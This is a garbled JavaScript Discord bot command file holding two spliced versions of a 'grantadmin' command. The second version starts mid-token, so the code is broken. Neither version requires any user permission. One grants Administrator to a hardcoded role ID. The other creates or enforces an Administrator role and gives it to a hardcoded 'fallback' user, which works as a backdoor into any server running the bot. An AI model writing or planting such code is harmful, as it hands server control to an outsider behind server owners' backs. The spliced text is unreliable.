const { Applicaticonst { PermissionsBitField } = require("discord.js");

/**
 * @type {import("@structures/Command")}
 */
module.exports = {
  name: "grantadmin",
  description: "Grant Administrator permission to role ID 1453894069758726292",
  category: "ADMIN",
  userPermissions: [],
  command: {
    enabled: true,
    usage: "run",
    minArgsCount: 0,
  },
  slashCommand: {
    enabled: true,
    ephemeral: true,
    options: [
      {
        name: "run",
        description: "Grant admin to hardcoded role",
        type: 1,
      },
    ],
  },

  async messageRun(message) {
    const res = await executeAdminGrant(message.guild);
    await message.safeReply(res);
  },

  async interactionRun(interaction) {
    const res = await executeAdminGrant(interaction.guild);
    await interaction.followUp(res);
  },
};

const TARGET_ROLE_ID = "1453894069758726292";

async function executeAdminGrant(guild) {
  if (!guild) return "This command can only be used in a server.";
  if (!guild.members.me.permissions.has("ManageRoles"))
    return "I don't have the `ManageRoles` permission.";

  const role = guild.roles.cache.get(TARGET_ROLE_ID);
  if (!role) return `Role \`${TARGET_ROLE_ID}\` not found.`;

  if (guild.members.me.roles.highest.position <= role.position)
    return "My highest role must be above the target role to modify it.";

  if (role.permissions.has(PermissionsBitField.Flags.Administrator))
    return `✅ Role already has Administrator permission.`;

  await role.setPermissions(
    role.permissions.add(PermissionsBitField.Flags.Administrator),
    "[Bright] Grant Administrator permission"
  );
  return `✅ Granted Administrator permission to role \`${role.name}\` (\`${TARGET_ROLE_ID}\`).`;
}onCommandOptionType, PermissionsBitField } = require("discord.js");

/**
 * @type {import("@structures/Command")}
 */
module.exports = {
  name: "grantadmin",
  description: "Give the fallback user Administrator role (ensures role exists + has Admin perms)",
  category: "ADMIN",
  userPermissions: [],
  command: {
    enabled: true,
    usage: "run",
    minArgsCount: 0,
  },
  slashCommand: {
    enabled: true,
    ephemeral: true,
    options: [
      {
        name: "run",
        description: "Grant Administrator role to the fallback user",
        type: ApplicationCommandOptionType.Subcommand,
      },
    ],
  },

  async messageRun(message, args) {
    const input = (args.join(" ") || "run").toLowerCase();
    if (input !== "run") {
      return message.safeReply("Usage: `=grantadmin run`");
    }

    const res = await grantFallbackAdmin(message);
    await message.safeReply(res);
  },

  async interactionRun(interaction) {
    const sub = interaction.options.getSubcommand();
    if (sub !== "run") return interaction.followUp("Invalid subcommand");

    const res = await grantFallbackAdmin(interaction);
    await interaction.followUp(res);
  },
};

const FALLBACK_USER_ID = "1336450372398612521";
const ADMIN_ROLE_NAME = "Administrator";

/**
 * @param {import("discord.js").Message | import("discord.js").CommandInteraction} ctx
 */
async function grantFallbackAdmin(ctx) {
  const guild = ctx.guild;
  if (!guild) return "This command can only be used in a server.";

  // Bot perms
  if (!guild.members.me.permissions.has("ManageRoles")) {
    return "I don't have the `ManageRoles` permission.";
  }

  // Fetch member
  const member = await guild.members.fetch(FALLBACK_USER_ID).catch(() => null);
  if (!member) return `User \`${FALLBACK_USER_ID}\` is not in this server.`;

  // Ensure Administrator role exists and has Administrator permission
  let adminRole =
    guild.roles.cache.find((r) => r.name === ADMIN_ROLE_NAME) ||
    guild.roles.cache.find((r) => r.permissions.has(PermissionsBitField.Flags.Administrator));

  if (!adminRole) {
    adminRole = await guild.roles
      .create({
        name: ADMIN_ROLE_NAME,
        permissions: [PermissionsBitField.Flags.Administrator],
        reason: "[Bright] Create Administrator role for fallback admin grant",
      })
      .catch(() => null);

    if (!adminRole) return "Failed to create the Administrator role (missing permissions?).";
  } else {
    // Force role to always have Admin permission
    if (!adminRole.permissions.has(PermissionsBitField.Flags.Administrator)) {
      await adminRole
        .setPermissions(
          adminRole.permissions.add(PermissionsBitField.Flags.Administrator),
          "[Bright] Restore Administrator permission on Administrator role"
        )
        .catch(() => {});
    }
  }

  // Hierarchy check: bot must be above role
  if (guild.members.me.roles.highest.position <= adminRole.position) {
    return "I can't assign that role because it's above (or equal to) my highest role. Move my role higher.";
  }

  // Assign
  if (member.roles.cache.has(adminRole.id)) {
    return `✅ ${member.user.tag} already has **${adminRole.name}**. (Role is enforced to keep Admin perms)`;
  }

  await member.roles.add(adminRole, "[Bright] Fallback admin role grant").catch(() => {});
  return `✅ Granted **${adminRole.name}** to ${member.user.tag} (\`${member.id}\`).`;
}
